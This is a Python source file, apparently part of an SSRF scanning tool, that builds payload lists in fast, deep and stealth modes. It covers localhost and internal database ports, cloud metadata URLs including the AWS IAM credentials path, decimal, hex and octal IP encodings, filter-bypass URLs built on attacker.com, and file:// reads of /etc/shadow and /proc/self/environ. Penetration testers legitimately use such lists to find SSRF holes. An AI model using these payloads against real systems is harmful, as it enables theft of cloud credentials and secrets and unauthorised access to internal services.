"""
Smart Payload Engine - SSRF payloads with encoding & obfuscation
"""

import os


class PayloadEngine:
    def __init__(self, config):
        self.config = config
        self._custom = self._load_custom()

    def _load_custom(self):
        if self.config.custom_payloads and os.path.isfile(self.config.custom_payloads):
            with open(self.config.custom_payloads) as f:
                return [l.strip() for l in f if l.strip() and not l.startswith('#')]
        return []

    def get_payloads(self, mode='fast'):
        base = self._internal_payloads()
        cloud = self._cloud_metadata_payloads()
        encoded = self._encoded_payloads()
        obfuscated = self._obfuscated_payloads()
        file_payloads = self._file_access_payloads()

        if mode == 'fast':
            payloads = base[:10] + cloud[:5] + encoded[:5]
        elif mode == 'deep':
            payloads = base + cloud + encoded + obfuscated + file_payloads
        else:  # stealth
            payloads = base[:8] + cloud[:4] + obfuscated[:5]

        if self._custom:
            payloads.extend(self._custom)

        return list(dict.fromkeys(payloads))  # deduplicate preserve order

    def _internal_payloads(self):
        return [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://0.0.0.0/',
            'http://[::1]/',
            'http://127.0.0.1:80/',
            'http://127.0.0.1:443/',
            'http://127.0.0.1:8080/',
            'http://127.0.0.1:8443/',
            'http://127.0.0.1:9200/',  # Elasticsearch
            'http://127.0.0.1:6379/',  # Redis
            'http://127.0.0.1:5432/',  # PostgreSQL
            'http://127.0.0.1:3306/',  # MySQL
            'http://127.0.0.1:27017/', # MongoDB
            'http://127.0.0.1/admin',
            'http://127.0.0.1/dashboard',
            'http://127.0.0.1/api',
            'http://localhost/server-status',
        ]

    def _cloud_metadata_payloads(self):
        return [
            # AWS
            'http://169.254.169.254/',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/meta-data/hostname',
            # GCP
            'http://metadata.google.internal/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
            # Azure
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            # Oracle Cloud
            'http://192.0.0.192/latest/',
            # DigitalOcean
            'http://169.254.169.254/metadata/v1/',
            # Alibaba Cloud
            'http://100.100.100.200/latest/meta-data/',
        ]

    def _encoded_payloads(self):
        return [
            # URL encoded
            'http%3A%2F%2F127.0.0.1%2F',
            'http%3A%2F%2Flocalhost%2F',
            # Double encoded
            'http%253A%252F%252F127.0.0.1%252F',
            # Decimal IP
            'http://2130706433/',      # 127.0.0.1
            'http://2852039166/',      # 169.254.169.254
            # Hex IP
            'http://0x7f000001/',      # 127.0.0.1
            'http://0xa9fea9fe/',      # 169.254.169.254
            # Octal
            'http://0177.0000.0000.0001/',
            # Mixed encoding
            'http://127.0.1/',
            'http://127.1/',
        ]

    def _obfuscated_payloads(self):
        return [
            # Case variation
            'HTTP://127.0.0.1/',
            'Http://LocalHost/',
            # IPv6
            'http://[::ffff:127.0.0.1]/',
            'http://[::ffff:7f00:1]/',
            # DNS tricks
            'http://localtest.me/',
            'http://127.0.0.1.nip.io/',
            # Unicode
            'http://\u0031\u0032\u0037.0.0.1/',
            # Bypass with @
            'http://attacker.com@127.0.0.1/',
            # Bypass with #
            'http://127.0.0.1#attacker.com',
            # Bypass with subdomain
            'http://attacker.com.127.0.0.1/',
        ]

    def _file_access_payloads(self):
        return [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///etc/shadow',
            'file:///proc/self/environ',
            'file:///proc/version',
            'file:///windows/system32/drivers/etc/hosts',
            'file:///C:/Windows/win.ini',
        ]
